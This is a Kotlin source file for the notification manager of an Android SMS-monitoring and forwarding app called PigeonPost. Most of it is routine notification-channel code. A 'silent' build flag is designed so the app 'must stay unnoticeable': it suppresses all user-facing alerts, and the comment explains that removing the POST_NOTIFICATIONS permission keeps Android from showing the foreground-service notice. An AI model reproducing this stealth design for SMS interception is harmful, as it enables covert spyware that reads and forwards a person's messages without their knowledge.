package com.octopus.pigeon.post.util

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import androidx.core.app.NotificationCompat
import com.octopus.logging.PigeonLogRedactor
import com.octopus.logging.PigeonLogger
import com.octopus.pigeon.post.BuildConfig
import com.octopus.pigeon.post.R
import com.octopus.pigeon.post.ui.activity.MainActivity

/**
 * Enhanced notification manager for PigeonPost
 * Supports independent notifications for SMS reception and forwarding
 * Renamed to avoid conflicts with Android's NotificationManager
 */
object PigeonPostNotificationManager {
    // Notification IDs
    private const val SMS_RECEIVED_NOTIFICATION_ID = 3
    private const val SMS_FORWARDED_NOTIFICATION_ID = 4

    // Notification channels
    private const val SMS_RECEIVED_CHANNEL_ID = "sms_received_channel"
    private const val SMS_FORWARDED_CHANNEL_ID = "sms_forwarded_channel"

    // Notification group
    private const val SMS_NOTIFICATION_GROUP = "sms_notifications"

    // Flag to track if channels have been initialized
    @Volatile
    private var channelsInitialized = false

    /**
     * The silent build must stay unnoticeable, so none of the user-facing
     * notifications are created at all.
     *
     * The mandatory foreground-service notification posted by
     * SmsMonitorService is not routed through here, and it does not need this
     * gate: the silent flavour drops the POST_NOTIFICATIONS declaration, which
     * is what stops Android from displaying it.
     */
    private val notificationsSuppressed: Boolean = BuildConfig.SILENT

    /**
     * Initialize notification channels
     */
    fun initializeChannels(context: Context) {
        if (notificationsSuppressed) return

        val notificationManager =
            context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // Create SMS received notification channel - high priority supports Heads-up
        val smsReceivedChannel =
            NotificationChannel(
                SMS_RECEIVED_CHANNEL_ID,
                context.getString(R.string.sms_received_notification),
                NotificationManager.IMPORTANCE_HIGH, // High priority, supports Heads-up notifications
            ).apply {
                description = context.getString(R.string.sms_received_notification_desc)
                enableVibration(true)
                enableLights(true)
                setShowBadge(true)
                setBypassDnd(true) // Can bypass do not disturb mode
            }

        // Create forwarding success notification channel - default priority
        val smsForwardedChannel =
            NotificationChannel(
                SMS_FORWARDED_CHANNEL_ID,
                context.getString(R.string.sms_forward_result),
                NotificationManager.IMPORTANCE_DEFAULT,
            ).apply {
                description = context.getString(R.string.sms_forward_result_desc)
                enableVibration(false)
                enableLights(false)
                setShowBadge(true)
            }

        notificationManager.createNotificationChannel(smsReceivedChannel)
        notificationManager.createNotificationChannel(smsForwardedChannel)

        channelsInitialized = true
        PigeonLogger.info("PigeonPostNotificationManager", "Notification channels initialized")
    }

    /**
     * Ensure notification channels are initialized before showing notifications
     * This is a safety mechanism in case the app was killed and SMS arrives before Application.onCreate()
     */
    private fun ensureChannelsInitialized(context: Context) {
        if (!channelsInitialized) {
            PigeonLogger.warn(
                "PigeonPostNotificationManager",
                "Channels not initialized, initializing now as fallback",
            )
            initializeChannels(context)
        }
    }

    /**
     * Show SMS received notification (Heads-up notification)
     */
    fun showSmsReceivedNotification(
        context: Context,
        sender: String,
        contentPreview: String,
        isServiceRunning: Boolean,
        isEnabled: Boolean = true,
        statusOverride: String? = null,
    ) {
        if (notificationsSuppressed) return

        PigeonLogger.info("PigeonPostNotificationManager", "📱 showSmsReceivedNotification called:")
        PigeonLogger.info(
            "PigeonPostNotificationManager",
            "   - sender: ${PigeonLogRedactor.tag(sender)}",
        )
        PigeonLogger.info("PigeonPostNotificationManager", "   - isEnabled: $isEnabled")
        PigeonLogger.info(
            "PigeonPostNotificationManager",
            "   - isServiceRunning: $isServiceRunning",
        )

        if (!isEnabled) {
            PigeonLogger.warn(
                "PigeonPostNotificationManager",
                "❌ Notification is DISABLED, skipping",
            )
            return
        }

        // Ensure channels are initialized before showing notification
        ensureChannelsInitialized(context)

        val notificationManager =
            context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // Check if notifications are enabled at system level
        if (!notificationManager.areNotificationsEnabled()) {
            PigeonLogger.error(
                "PigeonPostNotificationManager",
                "❌ System notifications are DISABLED for this app!",
            )
            PigeonLogger.error(
                "PigeonPostNotificationManager",
                "   Please enable notifications in system settings",
            )
            return
        }

        // Check if App is in foreground, if so don't show notification
        // Note: Currently always returns false, can be improved later
        if (isAppInForeground(context)) {
            PigeonLogger.debug(
                "PigeonPostNotificationManager",
                "App is running in foreground, skipping SMS received notification",
            )
            return
        }

        val intent =
            Intent(context, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            }

        val pendingIntent =
            PendingIntent.getActivity(
                context,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
            )

        val statusText =
            statusOverride
                ?: if (isServiceRunning) {
                    context.getString(R.string.status_processing)
                } else {
                    context.getString(
                        R.string.status_service_not_running,
                    )
                }
        val preview =
            if (contentPreview.length > 50) "${contentPreview.take(50)}..." else contentPreview

        val notification =
            NotificationCompat
                .Builder(context, SMS_RECEIVED_CHANNEL_ID)
                .setContentTitle(context.getString(R.string.sms_received_title))
                .setContentText(context.getString(R.string.sms_from, sender))
                .setStyle(
                    NotificationCompat
                        .BigTextStyle()
                        .bigText(
                            context.getString(
                                R.string.sms_notification_details,
                                sender,
                                preview,
                                statusText,
                            ),
                        ),
                ).setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_HIGH) // High priority
                .setCategory(NotificationCompat.CATEGORY_MESSAGE)
                .setAutoCancel(true)
                .setGroup(SMS_NOTIFICATION_GROUP)
                .setVibrate(longArrayOf(0, 300, 200, 300)) // Vibration pattern
                .setLights(0xFF00FF00.toInt(), 1000, 1000) // Green indicator light
                .build()

        try {
            notificationManager.notify(SMS_RECEIVED_NOTIFICATION_ID, notification)
            PigeonLogger.info(
                "PigeonPostNotificationManager",
                "✅ SMS received notification posted successfully: sender=$sender",
            )
        } catch (e: Exception) {
            PigeonLogger.error("PigeonPostNotificationManager", "❌ Failed to post notification", e)
        }
    }

    /**
     * Show forward success notification
     */
    fun showForwardSuccessNotification(
        context: Context,
        sender: String,
        templateKeyword: String? = null,
        isEnabled: Boolean = true,
    ) {
        if (notificationsSuppressed) return

        PigeonLogger.info(
            "PigeonPostNotificationManager",
            "✅ showForwardSuccessNotification called:",
        )
        PigeonLogger.info(
            "PigeonPostNotificationManager",
            "   - sender: ${PigeonLogRedactor.tag(sender)}",
        )
        PigeonLogger.info("PigeonPostNotificationManager", "   - keyword: $templateKeyword")
        PigeonLogger.info("PigeonPostNotificationManager", "   - isEnabled: $isEnabled")

        if (!isEnabled) {
            PigeonLogger.warn(
                "PigeonPostNotificationManager",
                "❌ Forward success notification is DISABLED, skipping",
            )
            return
        }

        // Ensure channels are initialized before showing notification
        ensureChannelsInitialized(context)

        val notificationManager =
            context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // Check if notifications are enabled at system level
        if (!notificationManager.areNotificationsEnabled()) {
            PigeonLogger.error(
                "PigeonPostNotificationManager",
                "❌ System notifications are DISABLED for this app!",
            )
            return
        }

        val intent =
            Intent(context, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            }

        val pendingIntent =
            PendingIntent.getActivity(
                context,
                1,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
            )

        val contentText =
            if (templateKeyword != null) {
                context.getString(R.string.sms_forward_success_with_keyword, sender, templateKeyword)
            } else {
                context.getString(R.string.sms_forward_success, sender)
            }

        val notification =
            NotificationCompat
                .Builder(context, SMS_FORWARDED_CHANNEL_ID)
                .setContentTitle(context.getString(R.string.sms_forward_success_title))
                .setContentText(contentText.take(50) + if (contentText.length > 50) "..." else "")
                .setStyle(NotificationCompat.BigTextStyle().bigText(contentText))
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                .setCategory(NotificationCompat.CATEGORY_STATUS)
                .setAutoCancel(true)
                .setGroup(SMS_NOTIFICATION_GROUP)
                .build()

        try {
            notificationManager.notify(SMS_FORWARDED_NOTIFICATION_ID, notification)
            PigeonLogger.info(
                "PigeonPostNotificationManager",
                "✅ Forward success notification posted successfully: sender=$sender",
            )
        } catch (e: Exception) {
            PigeonLogger.error(
                "PigeonPostNotificationManager",
                "❌ Failed to post forward success notification",
                e,
            )
        }
    }

    /**
     * Show forward failure notification
     */
    fun showForwardFailureNotification(
        context: Context,
        sender: String,
        errorMessage: String,
        isEnabled: Boolean = true,
    ) {
        if (notificationsSuppressed) return

        PigeonLogger.info(
            "PigeonPostNotificationManager",
            "❌ showForwardFailureNotification called:",
        )
        PigeonLogger.info(
            "PigeonPostNotificationManager",
            "   - sender: ${PigeonLogRedactor.tag(sender)}",
        )
        PigeonLogger.info("PigeonPostNotificationManager", "   - error: $errorMessage")
        PigeonLogger.info("PigeonPostNotificationManager", "   - isEnabled: $isEnabled")

        if (!isEnabled) {
            PigeonLogger.warn(
                "PigeonPostNotificationManager",
                "❌ Forward failure notification is DISABLED, skipping",
            )
            return
        }

        // Ensure channels are initialized before showing notification
        ensureChannelsInitialized(context)

        val notificationManager =
            context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // Check if notifications are enabled at system level
        if (!notificationManager.areNotificationsEnabled()) {
            PigeonLogger.error(
                "PigeonPostNotificationManager",
                "❌ System notifications are DISABLED for this app!",
            )
            return
        }

        val intent =
            Intent(context, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            }

        val pendingIntent =
            PendingIntent.getActivity(
                context,
                2,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
            )

        val contentText = context.getString(R.string.sms_forward_failed, sender, errorMessage)

        val notification =
            NotificationCompat
                .Builder(context, SMS_FORWARDED_CHANNEL_ID)
                .setContentTitle(context.getString(R.string.sms_forward_failed_title))
                .setContentText(contentText.take(50) + if (contentText.length > 50) "..." else "")
                .setStyle(NotificationCompat.BigTextStyle().bigText(contentText))
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                .setCategory(NotificationCompat.CATEGORY_ERROR)
                .setAutoCancel(true)
                .setGroup(SMS_NOTIFICATION_GROUP)
                .build()

        try {
            notificationManager.notify(SMS_FORWARDED_NOTIFICATION_ID, notification)
            PigeonLogger.info(
                "PigeonPostNotificationManager",
                "✅ Forward failure notification posted successfully: sender=$sender",
            )
        } catch (e: Exception) {
            PigeonLogger.error(
                "PigeonPostNotificationManager",
                "❌ Failed to post forward failure notification",
                e,
            )
        }
    }

    /**
     * Clear all SMS related notifications
     */
    fun clearAllSmsNotifications(context: Context) {
        val notificationManager =
            context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.cancel(SMS_RECEIVED_NOTIFICATION_ID)
        notificationManager.cancel(SMS_FORWARDED_NOTIFICATION_ID)
    }

    /**
     * Check if App is running in foreground
     * Simplified implementation - might need more complex checking in actual projects
     */
    private fun isAppInForeground(context: Context): Boolean {
        // Here you can check Activity status or use ActivityManager to determine
        // For simplified implementation, return false for now, can be improved later as needed
        return false
    }
}
